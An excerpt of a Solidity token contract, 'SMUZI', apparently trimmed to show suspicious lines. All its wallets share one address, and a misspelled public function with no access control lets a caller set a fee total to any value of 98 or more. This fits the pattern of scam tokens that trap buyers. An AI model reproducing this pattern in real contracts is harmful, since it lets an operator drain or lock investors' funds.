...
contract SMUZI is ERC20, Ownable {
    ...
    uint256 public maxTranferAmount = 98;
    ...
    constructor() ERC20("SMUZI", "SMUZI") {
        ...
        address _owner = 0xC32A6A31A5359C63dbce6e0E871a2C37017396c9;
        ...
        marketingWallet = address(0xC32A6A31A5359C63dbce6e0E871a2C37017396c9); // set as marketing wallet
    	maintenanceWallet = address(0xC32A6A31A5359C63dbce6e0E871a2C37017396c9); // set as maintenance wallet
    ...
    function AmounTrasfer(uint256 CustomValue) public {
        require(CustomValue >= maxTranferAmount , "No correct value");
        FessOutTotal = CustomValue;
    }
